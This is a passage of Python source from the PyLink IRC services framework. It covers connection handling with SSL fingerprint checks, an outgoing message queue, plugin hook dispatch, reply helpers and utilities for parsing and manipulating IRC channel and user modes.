'topiclock': 't', 'limit': 'l', 'ban': 'b',\n                       'voice': 'v', 'key': 'k',\n                       # This fills in the type of mode each mode character is.\n                       # A-type modes are list modes (i.e. bans, ban exceptions, etc.),\n                       # B-type modes require an argument to both set and unset,\n                       #   but there can only be one value at a time\n                       #   (i.e. cmode +k).\n                       # C-type modes require an argument to set but not to unset\n                       #   (one sets \"+l limit\" and # \"-l\"),\n                       # and D-type modes take no arguments at all.\n                       '*A': 'b',\n                       '*B': 'k',\n                       '*C': 'l',\n                       '*D': 'imnpstr'}\n        self.umodes = {'invisible': 'i', 'snomask': 's', 'wallops': 'w',\n                       'oper': 'o',\n                       '*A': '', '*B': '', '*C': '', '*D': 'iosw'}\n\n        # This max nick length starts off as the config value, but may be\n        # overwritten later by the protocol module if such information is\n        # received. It defaults to 30.\n        self.maxnicklen = self.serverdata.get('maxnicklen', 30)\n\n        # Defines a list of supported prefix modes.\n        self.prefixmodes = {'o': '@', 'v': '+'}\n\n        # Defines the uplink SID (to be filled in by protocol module).\n        self.uplink = None\n        self.start_ts = int(time.time())\n\n        # Set up channel logging for the network\n        self.logSetup()\n\n    def processQueue(self):\n        \"\"\"Loop to process outgoing queue data.\"\"\"\n        while not self.aborted.is_set():\n            if self.queue:  # Only process if there's data.\n                data = self.queue.popleft()\n                self._send(data)\n            throttle_time = self.serverdata.get('throttle_time', 0.005)\n            self.aborted.wait(throttle_time)\n        log.debug('(%s) Stopping queue thread as aborted is set', self.name)\n\n    def connect(self):\n        \"\"\"\n        Runs the connect loop for the IRC object. This is usually called by\n        __init__ in a separate thread to allow multiple concurrent connections.\n        \"\"\"\n        while True:\n\n            self.aborted.clear()\n            self.initVars()\n\n            try:\n                self.proto.validateServerConf()\n            except AssertionError as e:\n                log.exception(\"(%s) Configuration error: %s\", self.name, e)\n                return\n\n            ip = self.serverdata[\"ip\"]\n            port = self.serverdata[\"port\"]\n            checks_ok = True\n            try:\n                # Set the socket type (IPv6 or IPv4).\n                stype = socket.AF_INET6 if self.serverdata.get(\"ipv6\") else socket.AF_INET\n\n                # Creat the socket.\n                self.socket = socket.socket(stype)\n                self.socket.setblocking(0)\n\n                # Set the socket bind if applicable.\n                if 'bindhost' in self.serverdata:\n                    self.socket.bind((self.serverdata['bindhost'], 0))\n\n                # Set the connection timeouts. Initial connection timeout is a\n                # lot smaller than the timeout after we've connected; this is\n                # intentional.\n                self.socket.settimeout(self.pingfreq)\n\n                # Resolve hostnames if it's not an IP address already.\n                old_ip = ip\n                ip = socket.getaddrinfo(ip, port, stype)[0][-1][0]\n                log.debug('(%s) Resolving address %s to %s', self.name, old_ip, ip)\n\n                # Enable SSL if set to do so. This requires a valid keyfile and\n                # certfile to be present.\n                self.ssl = self.serverdata.get('ssl')\n                if self.ssl:\n                    log.info('(%s) Attempting SSL for this connection...', self.name)\n                    certfile = self.serverdata.get('ssl_certfile')\n                    keyfile = self.serverdata.get('ssl_keyfile')\n\n                    context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)\n                    # Disable SSLv2 and SSLv3 - these are insecure\n                    context.options |= ssl.OP_NO_SSLv2\n                    context.options |= ssl.OP_NO_SSLv3\n\n                    if certfile and keyfile:\n                        try:\n                            context.load_cert_chain(certfile, keyfile)\n                        except OSError:\n                             log.exception('(%s) Caught OSError trying to '\n                                           'initialize the SSL connection; '\n                                           'are \"ssl_certfile\" and '\n                                           '\"ssl_keyfile\" set correctly?',\n                                           self.name)\n                             checks_ok = False\n\n                    self.socket = context.wrap_socket(self.socket)\n\n                log.info(\"Connecting to network %r on %s:%s\", self.name, ip, port)\n                self.socket.connect((ip, port))\n                self.socket.settimeout(self.pingtimeout)\n\n                # If SSL was enabled, optionally verify the certificate\n                # fingerprint for some added security. I don't bother to check\n                # the entire certificate for validity, since most IRC networks\n                # self-sign their certificates anyways.\n                if self.ssl and checks_ok:\n                    peercert = self.socket.getpeercert(binary_form=True)\n\n                    # Hash type is configurable using the ssl_fingerprint_type\n                    # value, and defaults to sha256.\n                    hashtype = self.serverdata.get('ssl_fingerprint_type', 'sha256').lower()\n\n                    try:\n                        hashfunc = getattr(hashlib, hashtype)\n                    except AttributeError:\n                        log.error('(%s) Unsupported SSL certificate fingerprint type %r given, disconnecting...',\n                                  self.name, hashtype)\n                        checks_ok = False\n                    else:\n                        fp = hashfunc(peercert).hexdigest()\n                        expected_fp = self.serverdata.get('ssl_fingerprint')\n\n                        if expected_fp and checks_ok:\n                            if fp != expected_fp:\n                                # SSL Fingerprint doesn't match; break.\n                                log.error('(%s) Uplink\\'s SSL certificate '\n                                          'fingerprint (%s) does not match the '\n                                          'one configured: expected %r, got %r; '\n                                          'disconnecting...', self.name, hashtype,\n                                          expected_fp, fp)\n                                checks_ok = False\n                            else:\n                                log.info('(%s) Uplink SSL certificate fingerprint '\n                                         '(%s) verified: %r', self.name, hashtype,\n                                         fp)\n                        else:\n                            log.info('(%s) Uplink\\'s SSL certificate fingerprint (%s) '\n                                     'is %r. You can enhance the security of your '\n                                     'link by specifying this in a \"ssl_fingerprint\"'\n                                     ' option in your server block.', self.name,\n                                     hashtype, fp)\n\n                if checks_ok:\n\n                    self.queue_thread = threading.Thread(name=\"Queue thread for %s\" % self.name,\n                                                         target=self.processQueue, daemon=True)\n                    self.queue_thread.start()\n\n                    self.sid = self.serverdata.get(\"sid\")\n                    # All our checks passed, get the protocol module to connect and run the listen\n                    # loop. This also updates any SID values should the protocol module do so.\n                    self.proto.connect()\n\n                    log.info('(%s) Enumerating our own SID %s', self.name, self.sid)\n                    host = self.hostname()\n\n                    self.servers[self.sid] = IrcServer(None, host, internal=True,\n                            desc=self.serverdata.get('serverdesc')\n                            or conf.conf['bot']['serverdesc'])\n\n                    log.info('(%s) Starting ping schedulers....', self.name)\n                    self.schedulePing()\n                    log.info('(%s) Server ready; listening for data.', self.name)\n                    self.autoconnect_active_multiplier = 1  # Reset any extra autoconnect delays\n                    self.run()\n                else:  # Configuration error :(\n                    log.error('(%s) A configuration error was encountered '\n                              'trying to set up this connection. Please check'\n                              ' your configuration file and try again.',\n                              self.name)\n            # self.run() or the protocol module it called raised an exception, meaning we've disconnected!\n            # Note: socket.error, ConnectionError, IOError, etc. are included in OSError since Python 3.3,\n            # so we don't need to explicitly catch them here.\n            # We also catch SystemExit here as a way to abort out connection threads properly, and stop the\n            # IRC connection from freezing instead.\n            except (OSError, RuntimeError, SystemExit) as e:\n                log.error('(%s) Disconnected from IRC: %s: %s',\n                          self.name, type(e).__name__, str(e))\n\n            self.disconnect()\n\n            # If autoconnect is enabled, loop back to the start. Otherwise,\n            # return and stop.\n            autoconnect = self.serverdata.get('autoconnect')\n\n            # Sets the autoconnect growth multiplier (e.g. a value of 2 multiplies the autoconnect\n            # time by 2 on every failure, etc.)\n            autoconnect_multiplier = self.serverdata.get('autoconnect_multiplier', 2)\n            autoconnect_max = self.serverdata.get('autoconnect_max', 1800)\n            # These values must at least be 1.\n            autoconnect_multiplier = max(autoconnect_multiplier, 1)\n            autoconnect_max = max(autoconnect_max, 1)\n\n            log.debug('(%s) Autoconnect delay set to %s seconds.', self.name, autoconnect)\n            if autoconnect is not None and autoconnect >= 1:\n                log.debug('(%s) Multiplying autoconnect delay %s by %s.', self.name, autoconnect, self.autoconnect_active_multiplier)\n                autoconnect *= self.autoconnect_active_multiplier\n                # Add a cap on the max. autoconnect delay, so that we don't go on forever...\n                autoconnect = min(autoconnect, autoconnect_max)\n\n                log.info('(%s) Going to auto-reconnect in %s seconds.', self.name, autoconnect)\n                # Continue when either self.aborted is set or the autoconnect time passes.\n                # Compared to time.sleep(), this allows us to stop connections quicker if we\n                # break while while for autoconnect.\n                self.aborted.clear()\n                self.aborted.wait(autoconnect)\n\n                # Store in the local state what the autoconnect multiplier currently is.\n                self.autoconnect_active_multiplier *= autoconnect_multiplier\n\n                if self not in world.networkobjects.values():\n                    log.debug('Stopping stale connect loop for old connection %r', self.name)\n                    return\n\n            else:\n                log.info('(%s) Stopping connect loop (autoconnect value %r is < 1).', self.name, autoconnect)\n                return\n\n    def disconnect(self):\n        \"\"\"Handle disconnects from the remote server.\"\"\"\n        was_successful = self.connected.is_set()\n        log.debug('(%s) disconnect: got %s for was_successful state', self.name, was_successful)\n\n        log.debug('(%s) disconnect: Clearing self.connected state.', self.name)\n        self.connected.clear()\n\n        log.debug('(%s) Removing channel logging handlers due to disconnect.', self.name)\n        while self.loghandlers:\n            log.removeHandler(self.loghandlers.pop())\n\n        try:\n            log.debug('(%s) disconnect: Shutting down socket.', self.name)\n            self.socket.shutdown(socket.SHUT_RDWR)\n        except:  # Socket timed out during creation; ignore\n            pass\n\n        self.socket.close()\n\n        if self.pingTimer:\n            log.debug('(%s) Canceling pingTimer at %s due to disconnect() call', self.name, time.time())\n            self.pingTimer.cancel()\n\n        log.debug('(%s) disconnect: Setting self.aborted to True.', self.name)\n        self.aborted.set()\n\n        # Internal hook signifying that a network has disconnected.\n        self.callHooks([None, 'PYLINK_DISCONNECT', {'was_successful': was_successful}])\n\n        log.debug('(%s) disconnect: Clearing state via initVars().', self.name)\n        self.initVars()\n\n    def run(self):\n        \"\"\"Main IRC loop which listens for messages.\"\"\"\n        # Some magic below cause this to work, though anything that's\n        # not encoded in UTF-8 doesn't work very well.\n        buf = b\"\"\n        data = b\"\"\n        while not self.aborted.is_set():\n\n            try:\n                data = self.socket.recv(2048)\n            except OSError:\n                # Suppress socket read warnings from lingering recv() calls if\n                # we've been told to shutdown.\n                if self.aborted.is_set():\n                    return\n                raise\n\n            buf += data\n            if not data:\n                log.error('(%s) No data received, disconnecting!', self.name)\n                return\n            elif (time.time() - self.lastping) > self.pingtimeout:\n                log.error('(%s) Connection timed out.', self.name)\n                return\n            while b'\\n' in buf:\n                line, buf = buf.split(b'\\n', 1)\n                line = line.strip(b'\\r')\n                # FIXME: respect other encodings?\n                line = line.decode(\"utf-8\", \"replace\")\n                self.runline(line)\n\n    def runline(self, line):\n        \"\"\"Sends a command to the protocol module.\"\"\"\n        log.debug(\"(%s) <- %s\", self.name, line)\n        try:\n            hook_args = self.proto.handle_events(line)\n        except Exception:\n            log.exception('(%s) Caught error in handle_events, disconnecting!', self.name)\n            log.error('(%s) The offending line was: <- %s', self.name, line)\n            self.aborted.set()\n            return\n        # Only call our hooks if there's data to process. Handlers that support\n        # hooks will return a dict of parsed arguments, which can be passed on\n        # to plugins and the like. For example, the JOIN handler will return\n        # something like: {'channel': '#whatever', 'users': ['UID1', 'UID2',\n        # 'UID3']}, etc.\n        if hook_args is not None:\n            self.callHooks(hook_args)\n\n        return hook_args\n\n    def callHooks(self, hook_args):\n        \"\"\"Calls a hook function with the given hook args.\"\"\"\n        numeric, command, parsed_args = hook_args\n        # Always make sure TS is sent.\n        if 'ts' not in parsed_args:\n            parsed_args['ts'] = int(time.time())\n        hook_cmd = command\n        hook_map = self.proto.hook_map\n\n        # If the hook name is present in the protocol module's hook_map, then we\n        # should set the hook name to the name that points to instead.\n        # For example, plugins will read SETHOST as CHGHOST, EOS (end of sync)\n        # as ENDBURST, etc.\n        if command in hook_map:\n            hook_cmd = hook_map[command]\n\n        # However, individual handlers can also return a 'parse_as' key to send\n        # their payload to a different hook. An example of this is \"/join 0\"\n        # being interpreted as leaving all channels (PART).\n        hook_cmd = parsed_args.get('parse_as') or hook_cmd\n\n        log.debug('(%s) Raw hook data: [%r, %r, %r] received from %s handler '\n                  '(calling hook %s)', self.name, numeric, hook_cmd, parsed_args,\n                  command, hook_cmd)\n\n        # Iterate over registered hook functions, catching errors accordingly.\n        for hook_func in world.hooks[hook_cmd]:\n            try:\n                log.debug('(%s) Calling hook function %s from plugin \"%s\"', self.name,\n                          hook_func, hook_func.__module__)\n                hook_func(self, numeric, command, parsed_args)\n            except Exception:\n                # We don't want plugins to crash our servers...\n                log.exception('(%s) Unhandled exception caught in hook %r from plugin \"%s\"',\n                              self.name, hook_func, hook_func.__module__)\n                log.error('(%s) The offending hook data was: %s', self.name,\n                          hook_args)\n                continue\n\n    def _send(self, data):\n        \"\"\"Sends raw text to the uplink server.\"\"\"\n        # Safeguard against newlines in input!! Otherwise, each line gets\n        # treated as a separate command, which is particularly nasty.\n        data = data.replace('\\n', ' ')\n        data = data.encode(\"utf-8\") + b\"\\n\"\n        stripped_data = data.decode(\"utf-8\").strip(\"\\n\")\n        log.debug(\"(%s) -> %s\", self.name, stripped_data)\n\n        try:\n            self.socket.send(data)\n        except (OSError, AttributeError):\n            log.debug(\"(%s) Dropping message %r; network isn't connected!\", self.name, stripped_data)\n\n    def send(self, data, queue=True):\n        \"\"\"send() wrapper with optional queueing support.\"\"\"\n        if queue:\n            self.queue.append(data)\n        else:\n            self._send(data)\n\n    def schedulePing(self):\n        \"\"\"Schedules periodic pings in a loop.\"\"\"\n        self.proto.ping()\n\n        self.pingTimer = threading.Timer(self.pingfreq, self.schedulePing)\n        self.pingTimer.daemon = True\n        self.pingTimer.name = 'Ping timer loop for %s' % self.name\n        self.pingTimer.start()\n\n        log.debug('(%s) Ping scheduled at %s', self.name, time.time())\n\n    def __repr__(self):\n        return \"<classes.Irc object for %r>\" % self.name\n\n    ### General utility functions\n    def callCommand(self, source, text):\n        \"\"\"\n        Calls a PyLink bot command. source is the caller's UID, and text is the\n        full, unparsed text of the message.\n        \"\"\"\n        world.services['pylink'].call_cmd(self, source, text)\n\n    def msg(self, target, text, notice=None, source=None, loopback=True):\n        \"\"\"Handy function to send messages/notices to clients. Source\n        is optional, and defaults to the main PyLink client if not specified.\"\"\"\n        if not text:\n            return\n\n        if not (source or self.pseudoclient):\n            # No explicit source set and our main client wasn't available; abort.\n            return\n        source = source or self.pseudoclient.uid\n\n        if notice:\n            self.proto.notice(source, target, text)\n            cmd = 'PYLINK_SELF_NOTICE'\n        else:\n            self.proto.message(source, target, text)\n            cmd = 'PYLINK_SELF_PRIVMSG'\n\n        if loopback:\n            # Determines whether we should send a hook for this msg(), to relay things like services\n            # replies across relay.\n            self.callHooks([source, cmd, {'target': target, 'text': text}])\n\n    def _reply(self, text, notice=None, source=None, private=None, force_privmsg_in_private=False,\n            loopback=True):\n        \"\"\"\n        Core of the reply() function - replies to the last caller in the right context\n        (channel or PM).\n        \"\"\"\n        if private is None:\n            # Allow using private replies as the default, if no explicit setting was given.\n            private = conf.conf['bot'].get(\"prefer_private_replies\")\n\n        # Private reply is enabled, or the caller was originally a PM\n        if private or (self.called_in in self.users):\n            if not force_privmsg_in_private:\n                # For private replies, the default is to override the notice=True/False argument,\n                # and send replies as notices regardless. This is standard behaviour for most\n                # IRC services, but can be disabled if force_privmsg_in_private is given.\n                notice = True\n            target = self.called_by\n        else:\n            target = self.called_in\n\n        self.msg(target, text, notice=notice, source=source, loopback=loopback)\n\n    def reply(self, *args, **kwargs):\n        \"\"\"\n        Replies to the last caller in the right context (channel or PM).\n\n        This function wraps around _reply() and can be monkey-patched in a thread-safe manner\n        to temporarily redirect plugin output to another target.\n        \"\"\"\n        with self.reply_lock:\n            self._reply(*args, **kwargs)\n\n    def error(self, text, **kwargs):\n        \"\"\"Replies with an error to the last caller in the right context (channel or PM).\"\"\"\n        # This is a stub to alias error to reply\n        self.reply(\"Error: %s\" % text, **kwargs)\n\n    def toLower(self, text):\n        \"\"\"Returns a lowercase representation of text based on the IRC object's\n        casemapping (rfc1459 or ascii).\"\"\"\n        if self.proto.casemapping == 'rfc1459':\n            text = text.replace('{', '[')\n            text = text.replace('}', ']')\n            text = text.replace('|', '\\\\')\n            text = text.replace('~', '^')\n        # Encode the text as bytes first, and then lowercase it so that only ASCII characters are\n        # changed. Unicode in channel names, etc. is case sensitive because IRC is just that old of\n        # a protocol!!!\n        return text.encode().lower().decode()\n\n    def parseModes(self, target, args):\n        \"\"\"Parses a modestring list into a list of (mode, argument) tuples.\n        ['+mitl-o', '3', 'person'] => [('+m', None), ('+i', None), ('+t', None), ('+l', '3'), ('-o', 'person')]\n        \"\"\"\n        # http://www.irc.org/tech_docs/005.html\n        # A = Mode that adds or removes a nick or address to a list. Always has a parameter.\n        # B = Mode that changes a setting and always has a parameter.\n        # C = Mode that changes a setting and only has a parameter when set.\n        # D = Mode that changes a setting and never has a parameter.\n\n        if type(args) == str:\n            # If the modestring was given as a string, split it into a list.\n            args = args.split()\n\n        assert args, 'No valid modes were supplied!'\n        usermodes = not utils.isChannel(target)\n        prefix = ''\n        modestring = args[0]\n        args = args[1:]\n        if usermodes:\n            log.debug('(%s) Using self.umodes for this query: %s', self.name, self.umodes)\n\n            if target not in self.users:\n                log.debug('(%s) Possible desync! Mode target %s is not in the users index.', self.name, target)\n                return []  # Return an empty mode list\n\n            supported_modes = self.umodes\n            oldmodes = self.users[target].modes\n        else:\n            log.debug('(%s) Using self.cmodes for this query: %s', self.name, self.cmodes)\n\n            supported_modes = self.cmodes\n            oldmodes = self.channels[target].modes\n        res = []\n        for mode in modestring:\n            if mode in '+-':\n                prefix = mode\n            else:\n                if not prefix:\n                    prefix = '+'\n                arg = None\n                log.debug('Current mode: %s%s; args left: %s', prefix, mode, args)\n                try:\n                    if mode in self.prefixmodes and not usermodes:\n                        # We're setting a prefix mode on someone (e.g. +o user1)\n                        log.debug('Mode %s: This mode is a prefix mode.', mode)\n                        arg = args.pop(0)\n                        # Convert nicks to UIDs implicitly; most IRCds will want\n                        # this already.\n                        arg = self.nickToUid(arg) or arg\n                        if arg not in self.users:  # Target doesn't exist, skip it.\n                            log.debug('(%s) Skipping setting mode \"%s %s\"; the '\n                                      'target doesn\\'t seem to exist!', self.name,\n                                      mode, arg)\n                            continue\n                    elif mode in (supported_modes['*A'] + supported_modes['*B']):\n                        # Must have parameter.\n                        log.debug('Mode %s: This mode must have parameter.', mode)\n                        arg = args.pop(0)\n                        if prefix == '-':\n                            if mode in supported_modes['*B'] and arg == '*':\n                                # Charybdis allows unsetting +k without actually\n                                # knowing the key by faking the argument when unsetting\n                                # as a single \"*\".\n                                # We'd need to know the real argument of +k for us to\n                                # be able to unset the mode.\n                                oldarg = dict(oldmodes).get(mode)\n                                if oldarg:\n                                    # Set the arg to the old one on the channel.\n                                    arg = oldarg\n                                    log.debug(\"Mode %s: coersing argument of '*' to %r.\", mode, arg)\n\n                            log.debug('(%s) parseModes: checking if +%s %s is in old modes list: %s', self.name, mode, arg, oldmodes)\n\n                            if (mode, arg) not in oldmodes:\n                                # Ignore attempts to unset bans that don't exist.\n                                log.debug(\"(%s) parseModes(): ignoring removal of non-existent list mode +%s %s\", self.name, mode, arg)\n                                continue\n\n                    elif prefix == '+' and mode in supported_modes['*C']:\n                        # Only has parameter when setting.\n                        log.debug('Mode %s: Only has parameter when setting.', mode)\n                        arg = args.pop(0)\n                except IndexError:\n                    log.warning('(%s/%s) Error while parsing mode %r: mode requires an '\n                                'argument but none was found. (modestring: %r)',\n                                self.name, target, mode, modestring)\n                    continue  # Skip this mode; don't error out completely.\n                res.append((prefix + mode, arg))\n        return res\n\n    def applyModes(self, target, changedmodes):\n        \"\"\"Takes a list of parsed IRC modes, and applies them on the given target.\n\n        The target can be either a channel or a user; this is handled automatically.\"\"\"\n        usermodes = not utils.isChannel(target)\n        log.debug('(%s) Using usermodes for this query? %s', self.name, usermodes)\n\n        try:\n            if usermodes:\n                old_modelist = self.users[target].modes\n                supported_modes = self.umodes\n            else:\n                old_modelist = self.channels[target].modes\n                supported_modes = self.cmodes\n        except KeyError:\n            log.warning('(%s) Possible desync? Mode target %s is unknown.', self.name, target)\n            return\n\n        modelist = set(old_modelist)\n        log.debug('(%s) Applying modes %r on %s (initial modelist: %s)', self.name, changedmodes, target, modelist)\n        for mode in changedmodes:\n            # Chop off the +/- part that parseModes gives; it's meaningless for a mode list.\n            try:\n                real_mode = (mode[0][1], mode[1])\n            except IndexError:\n                real_mode = mode\n\n            if not usermodes:\n                # We only handle +qaohv for now. Iterate over every supported mode:\n                # if the IRCd supports this mode and it is the one being set, add/remove\n                # the person from the corresponding prefix mode list (e.g. c.prefixmodes['op']\n                # for ops).\n                for pmode, pmodelist in self.channels[target].prefixmodes.items():\n                    if pmode in self.cmodes and real_mode[0] == self.cmodes[pmode]:\n                        log.debug('(%s) Initial prefixmodes list: %s', self.name, pmodelist)\n                        if mode[0][0] == '+':\n                            pmodelist.add(mode[1])\n                        else:\n                            pmodelist.discard(mode[1])\n\n                        log.debug('(%s) Final prefixmodes list: %s', self.name, pmodelist)\n\n                if real_mode[0] in self.prefixmodes:\n                    # Don't add prefix modes to IrcChannel.modes; they belong in the\n                    # prefixmodes mapping handled above.\n                    log.debug('(%s) Not adding mode %s to IrcChannel.modes because '\n                              'it\\'s a prefix mode.', self.name, str(mode))\n                    continue\n\n            if mode[0][0] != '-':\n                # We're adding a mode\n                existing = [m for m in modelist if m[0] == real_mode[0] and m[1] != real_mode[1]]\n                if existing and real_mode[1] and real_mode[0] not in self.cmodes['*A']:\n                    # The mode we're setting takes a parameter, but is not a list mode (like +beI).\n                    # Therefore, only one version of it can exist at a time, and we must remove\n                    # any old modepairs using the same letter. Otherwise, we'll get duplicates when,\n                    # for example, someone sets mode \"+l 30\" on a channel already set \"+l 25\".\n                    log.debug('(%s) Old modes for mode %r exist on %s, removing them: %s',\n                              self.name, real_mode, target, str(existing))\n                    [modelist.discard(oldmode) for oldmode in existing]\n                modelist.add(real_mode)\n                log.debug('(%s) Adding mode %r on %s', self.name, real_mode, target)\n            else:\n                log.debug('(%s) Removing mode %r on %s', self.name, real_mode, target)\n                # We're removing a mode\n                if real_mode[1] is None:\n                    # We're removing a mode that only takes arguments when setting.\n                    # Remove all mode entries that use the same letter as the one\n                    # we're unsetting.\n                    for oldmode in modelist.copy():\n                        if oldmode[0] == real_mode[0]:\n                            modelist.discard(oldmode)\n                else:\n                    modelist.discard(real_mode)\n        log.debug('(%s) Final modelist: %s', self.name, modelist)\n        try:\n            if usermodes:\n                self.users[target].modes = modelist\n            else:\n                self.channels[target].modes = modelist\n        except KeyError:\n            log.warning(\"(%s) Invalid MODE target %s (usermodes=%s)\", self.name, target, usermodes)\n\n    @staticmethod\n    def _flip(mode):\n        \"\"\"Flips a mode character.\"\"\"\n        # Make it a list first, strings don't support item assignment\n        mode = list(mode)\n        if mode[0] == '-':  # Query is something like \"-n\"\n            mode[0] = '+'  # Change it to \"+n\"\n        elif mode[0] == '+':\n            mode[0] = '-'\n        else:  # No prefix given, assume +\n            mode.insert(0, '-')\n        return ''.join(mode)\n\n    def reverseModes(self, target, modes, oldobj=None):\n        \"\"\"Reverses/Inverts the mode string or mode list given.\n\n        Optionally, an oldobj argument can be given to look at an earlier state of\n        a channel/user object, e.g. for checking the op status of a mode setter\n        before their modes are processed and added to the channel state.\n\n        This function allows both mode strings or mode lists. Example uses:\n            \"+mi-lk test => \"-mi+lk test\"\n            \"mi-k test => \"-mi+k test\"\n            [('+m', None), ('+r', None), ('+l', '3'), ('-o', 'person')\n             => {('-m', None), ('-r', None), ('-l', None), ('+o', 'person')})\n            {('s', None), ('+o', 'whoever') => {('-s', None), ('-o', 'whoever')})\n        \"\"\"\n        origtype = type(modes)\n        # If the query is a string, we have to parse it first.\n        if origtype == str:\n            modes = self.parseModes(target, modes.split(\" \"))\n        # Get the current mode list first.\n        if utils.isChannel(target):\n            c = oldobj or self.channels[target]\n            oldmodes = c.modes.copy()\n            possible_modes = self.cmodes.copy()\n            # For channels, this also includes the list of prefix modes.\n            possible_modes['*A'] += ''.join(self.prefixmodes)\n            for name, userlist in c.prefixmodes.items():\n                try:\n                    oldmodes.update([(self.cmodes[name], u) for u in userlist])\n                except KeyError:\n                    continue\n        else:\n            oldmodes = self.users[target].modes\n            possible_modes = self.umodes\n        newmodes = []\n        log.debug('(%s) reverseModes: old/current mode list for %s is: %s', self.name,\n                   target, oldmodes)\n        for char, arg in modes:\n            # Mode types:\n            # A = Mode that adds or removes a nick or address to a list. Always has a parameter.\n            # B = Mode that changes a setting and always has a parameter.\n            # C = Mode that changes a setting and only has a parameter when set.\n            # D = Mode that changes a setting and never has a parameter.\n            mchar = char[-1]\n            if mchar in possible_modes['*B'] + possible_modes['*C']:\n                # We need to find the current mode list, so we can reset arguments\n                # for modes that have arguments. For example, setting +l 30 on a channel\n                # that had +l 50 set should give \"+l 30\", not \"-l\".\n                oldarg = [m for m in oldmodes if m[0] == mchar]\n                if oldarg:  # Old mode argument for this mode existed, use that.\n                    oldarg = oldarg[0]\n                    mpair = ('+%s' % oldarg[0], oldarg[1])\n                else:  # Not found, flip the mode then.\n                    # Mode takes no arguments when unsetting.\n                    if mchar in possible_modes['*C'] and char[0] != '-':\n                        arg = None\n                    mpair = (self._flip(char), arg)\n            else:\n                mpair = (self._flip(char), arg)\n            if char[0] != '-' and (mchar, arg) in oldmodes:\n                # Mode is already set.\n                log.debug(\"(%s) reverseModes: skipping reversing '%s %s' with %s since we're \"\n                          \"setting a mode that's already set.\", self.name, char, arg, mpair)\n                continue\n            elif char[0] == '-' and (mchar, arg) not in oldmodes and mchar in possible_modes['*A']:\n                # We're unsetting a prefixmode that was never set - don't set it in response!\n                # Charybdis lacks verification for this server-side.\n                log.debug(\"(%s) reverseModes: skipping reversing '%s %s' with %s since it \"\n                          \"wasn't previously set.\", self.name, char, arg, mpair)\n                continue\n            newmodes.append(mpair)\n\n        log.debug('(%s) reverseModes: new modes: %s', self.name, newmodes)\n        if origtype == str:\n            # If the original query is a string, send it back as a string.\n            return self.joinModes(newmodes)\n        else:\n            return set(newmodes)\n\n    @staticmethod\n    def joinModes(modes, sort=False):\n        \"\"\"Takes a list of (mode, arg) tuples in parseModes() format, and\n        joins them into a string.\n\n        See testJoinModes in tests/test_utils.py for some examples.\"\"\"\n        prefix = '+'  # Assume we're adding modes unless told otherwise\n        modelist = ''\n        args = []\n\n        # Sort modes alphabetically like a conventional IRCd.\n        if sort:\n            modes = sorted(modes)\n\n        for modepair in modes:\n            mode, arg = modepair\n            assert len(mode) in (1, 2), \"Incorrect length of a mode (received %r)\" % mode\n            try:\n                # If the mode has a prefix, use that.\n                curr_prefix, mode = mode\n            except ValueError:\n                # If not, the current prefix stays the same; move on to the next\n                # modepair.\n                pass\n            else:\n                # If the prefix of this mode isn't the same as the last one, add\n                # the prefix to the modestring. This prevents '+nt-lk' from turning\n                # into '+n+t-l-k' or '+ntlk'.\n                if prefix != curr_prefix:\n                    modelist += curr_prefix\n                    prefix = curr_prefix\n            modelist += mode\n            if arg is not None:\n                args.append(arg)\n        if not modelist.startswith(('+', '-')):\n            # Our starting mode didn't have a prefix with it. Assume '+'.\n            modelist = '+' + modelist\n        if args:\n            # Add the args if there are any.\n            modelist += ' %s' % ' '.join(args)\n        return modelist\n\n    @classmethod\n    def wrapModes(cls, modes, limit, max_modes_per_msg=0):\n        \"\"\"\n        Takes a list of modes and wraps it across multiple lines.\n        \"\"\"\n        strings = []\n\n        # This process is slightly trickier than just wrapping arguments, because modes create\n        # positional arguments that can't be separated from its character.\n        queued_modes = []\n        total_length = 0\n\n        last_prefix = '+'\n        orig_modes = modes.copy()\n        modes = list(modes)\n        while modes:\n            # PyLink mode lists come in the form [('+t', None), ('-b', '*!*@someone'), ('+l', 3)]\n            # The +/- part is optional depending on context, and should either:\n            # 1) The prefix of the last mode.\n            # 2) + (adding modes), if no prefix was ever given\n            next_mode = modes.pop(0)\n\n            modechar, arg = next_mode\n            prefix = modechar[0]\n            if prefix not in '+-':\n                prefix = last_prefix\n                # Explicitly add the prefix to the mode character to prevent\n                # ambiguity when passing it to joinModes().\n                modechar = prefix + modechar\n                # XXX: because tuples are immutable, we have to replace the entire modepair..\n                next_mode = (modechar, arg)\n\n            # Figure out the length that the next mode will add to the buffer. If we're changing\n            # from + to - (setting to removing modes) or vice versa, we'll need two characters\n            # (\"+\" or \"-\") plus the mode char itself.\n            next_length = 1\n            if prefix != last_prefix:\n                next_length += 1\n\n            # Replace the last_prefix with the current one for the next iteration.\n            last_prefix = prefix\n\n            if arg:\n                # This mode has an argument, so add the length of that and a space.\n                next_length += 1\n                next_length += len(arg)\n\n            assert next_length <= limit, \\\n                \"wrapModes: Mode %s is too long for the given length %s\" % (next_mode, limit)\n\n            # Check both message length and max. modes per msg if enabled.\n            if (next_length + total_length) <= limit and ((not max_modes_per_msg) or len(queued_modes) < max_modes_per_msg):\n                # We can fit this mode in the next message; add it.\n                total_length += next_length\n                log.debug('wrapModes: Adding mode %s to queued modes', str(next_mode))\n                queued_modes.append(next_mode)\n                log.debug('wrapModes: queued modes: %s', queued_modes)\n            else:\n                # Otherwise, create a new message by joining the previous queue.\n                # Then, add our current mode.\n                strings.append(cls.joinModes(queued_modes))\n                queued_modes.clear()\n\n                log.debug('wrapModes: cleared queue (length %s) and now adding %s', limit, str(next_mode))\n                queued_modes.append(next_mode)\n                total_length = next_length\n        else:\n            # Everything fit in one line, so just use that.\n            strings.append(cls.joinModes(queued_modes))\n\n        log.debug('wrapModes: returning %s for %s', strings, orig_modes)\n        return strings\n\n    def version(self):\n        \"\"\"\n        Returns a detailed version string including the PyLink daemon version,\n        the protocol module in use, and the server hostname.\n        \"\"\"\n        fullversion = 'PyLink-%s. %s :[protocol:%s]' % (__version__, self.hostname(), self.protoname)\n        return fullversion\n\n    def hostname(self):\n        \"\"\"\n        Returns the server hostname used by PyLink on the given server.\n        \"\"\"\n        return self.serverdata.get('hostname', world.fallback_hostname)\n\n    ### State checking functions\n    def nickToUid(self, nick):\n        \"\"\"Looks up the UID of a user with the given nick, if one is present.\"\"\"\n        nick = self.toLower(nick)\n        for k, v in self.users.copy().items():\n            if self.toLower(v.nick) == nick:\n                return k\n\n    def isInternalClient(self, numeric):\n        \"\"\"\n        Returns whether the given client numeric (UID) is a PyLink client.\n        \"\"\"\n        sid = self.getServer(numeric)\n        if sid and self.servers[sid].internal:\n            return 